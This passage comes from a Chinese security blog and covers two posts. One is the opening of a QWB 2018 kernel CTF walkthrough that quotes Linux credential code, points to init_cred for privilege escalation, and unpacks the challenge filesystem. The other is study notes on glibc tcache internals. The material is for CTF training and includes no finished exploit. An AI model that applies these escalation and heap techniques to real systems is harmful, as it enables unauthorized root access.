CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个init_cred是一个具有最高权限的cred,可以考虑使用它或者其拷贝进行提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_creds - Prepare a new set of credentials for modification</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a new set of task credentials for modification.  A task&#x27;s creds</span></span><br><span class="line"><span class="comment"> * shouldn&#x27;t generally be modified directly, therefore this function is used to</span></span><br><span class="line"><span class="comment"> * prepare a new copy, which the caller then modifies and then commits by</span></span><br><span class="line"><span class="comment"> * calling commit_creds().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Preparation involves making a copy of the objective creds for modification.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns a pointer to the new creds-to-be if successful, NULL otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Call commit_creds() or abort_creds() to clean up.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	validate_process_creds();</span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(new, old, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred));</span><br><span class="line"></span><br><span class="line">	new-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	<span class="type">atomic_set</span>(&amp;new-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(new, <span class="number">0</span>);</span><br><span class="line">	get_group_info(new-&gt;group_info);</span><br><span class="line">	get_uid(new-&gt;user);</span><br><span class="line">	get_user_ns(new-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	key_get(new-&gt;session_keyring);</span><br><span class="line">	key_get(new-&gt;process_keyring);</span><br><span class="line">	key_get(new-&gt;thread_keyring);</span><br><span class="line">	key_get(new-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	new-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	validate_creds(new);</span><br><span class="line">	<span class="keyword">return</span> new;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	abort_creds(new);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure>







<h3 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018-core"></a>强网杯2018-core</h3><p>给了四个东西bzImage  core.cpio  start.sh  vmlinux,其中</p>
<p>bzImage是内核镜像</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (simple@vps-simple) <span class="comment">#19 SMP Mon Mar 19 18:50:28 CST 2018, RO-rootFS, swap_dev 0x6, Normal VGA</span></span><br></pre></td></tr></table></figure>

<p>vmlinux是带符号表的elf文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=1d8344e71a82bc43821029796ef65bebfe8e65c3, not stripped</span><br></pre></td></tr></table></figure>

<p><code>start.sh</code>是<code>qemu</code>启动内核的脚本,</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# <span class="built_in">cat</span> start.sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p><code>-initrd  ./core.cpio </code>指定使用<code>core.cpio</code>作为内存文件系统</p>
<p><code>kaslr </code>开启了内核地址随机化</p>
<p><code>-s</code> 开启了调试</p>
<p>解包core.cpio看看文件系统里有啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file core.cpio</span><br><span class="line">core.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compression, from Unix</span><br></pre></td></tr></table></figure>

<p>发现首先有一层gzip压缩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# mkdir core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# cp core.cpio ./core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# cd core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# mv core.cpio core.cpio.gz</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# gunzip core.cpio.gz</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# file core.cpio</span><br><span class="line">core.cpio: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>

<p>这时候已经没有gzip包了,是一个cpio归档文件,解包用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# cpio -idm &lt; core.cpio</span><br></pre></td></tr></table></figure>

<p>解包之后是一个linux目录树,值得注意的是根目录下有两个shell脚本,gen_cpio.sh和init</p>
<p>这个gen_cpio.sh会递归查找当前目录为根的目录树打包成cpio归档文件,也就是制作文件系统用的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>其中有五条关键指令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms		//将kallsyms内核符号表拷贝到.tmp下面,这就意味着普通用户可以读取</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict		//不允许普通用户读取kallsyms内核符号</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict	//不允许普通用户读取dmesg内核消息</span><br><span class="line">insmod /core.ko			//加载了一个内核模块叫core	</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh		//当前用户<span class="built_in">id</span>为1000,不是root</span><br></pre></td></tr></table></figure>

<p>ida64打开core.ko看看是什么东西</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/10/28/tcache/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/28/tcache/" class="post-title-link" itemprop="url">glibc2.27 tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-28 01:53:00 / Modified: 01:53:53" itemprop="dateCreated datePublished" datetime="2023-10-28T01:53:00+08:00">2023-10-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><p>glibc2.26之后</p>
<p>“如为死狂，则事无不成。”–&lt;&lt;最后的武士&gt;&gt;</p>
<h2 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"><span class="comment">//根据tcache下标求解其中堆块的大小</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">//根据堆块大小求解对应tcache下标</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"><span class="comment">//根据堆块的mem区大小,首先计算得到堆块的整体大小(包括元数据)然后计算对应tcache下标</span></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>tcache桶子下标</th>
<th>mem大小范围</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x18</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>63</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="tcache-perthread-struct类定义"><a href="#tcache-perthread-struct类定义" class="headerlink" title="tcache_perthread_struct类定义"></a>tcache_perthread_struct类定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="comment">//本堆块的mem区域第一个int被复用为next指针</span></span><br><span class="line"><span class="comment">//单向链表,next指针指向下一个空闲堆块的mem区域</span></span><br></pre></td></tr></table></figure>

<p>每个线程都有自己的tcache</p>
<p>也就是说,一个线程有一个<code>tcache_perthread_struct</code>结构体</p>
<p>counts[tidx]是计数器,记录tidx下标的tcache桶子中有几个堆块</p>
<p>entries[tidx]是链表头,指向tidx桶子中的第一个堆块</p>
<p>每个桶子中最多有<code>TCACHE_FILL_COUNT=7</code>个堆块,每个tcache_perthread_struct中有64个桶子</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20231027112655389.png" alt="image-20231027112655389"></p>
<h3 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><span class="comment">//将chunk放到tc_idx下标的tcache中</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//tcache_entry指针指向mem区,而不是基地址</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//头插法</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//tc_idx对应计数器自增</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span><span class="comment">//从tc_idx桶子中拿出一个堆块</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;<span class="comment">//线程死亡时释放这个线程的tcache,实际上调用free函数释放该线程的tcache中的堆块</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">	&#123;</span><br><span class="line">	  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">	  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">	  __libc_free (e);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">    <span class="comment">//tcache_perthread_struct这个结构本身就是堆上分配的一个堆块</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><p>调用malloc的过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc</span><br><span class="line">	-&gt;libc_malloc</span><br><span class="line">		-&gt;use tcache</span><br><span class="line">		-&gt;int_malloc</span><br></pre></td></tr></table></figure>

<p>如果在libc_malloc中使用tcache能够完成分配,则不需要调用int_malloc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启用tcache后,分配过程宏观上看是这样的</span><br><span class="line">如果libc_malloc中,发现对应tcache中有合适的堆块,直接拿出来返回</span><br><span class="line">否则需要调用int_malloc,对bins中的堆块进行缓存和分类,然后返回</span><br></pre></td></tr></table></figure>



<h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="libc_malloc"></a>libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">	....</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);<span class="comment">//计算应该到哪个tcache中取堆块</span></span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins		<span 